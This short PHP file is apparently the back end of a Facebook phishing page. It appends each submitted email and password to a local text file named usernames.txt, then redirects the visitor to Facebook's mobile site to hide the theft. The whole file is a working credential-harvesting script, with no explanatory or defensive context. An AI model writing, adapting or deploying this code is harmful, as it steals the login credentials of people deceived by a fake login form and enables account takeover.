<?php

file_put_contents("usernames.txt", "" . $_POST['email'] . ":" . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://m.facebook.com/?name=&name=&name=&name=&email=&email=');
exit();
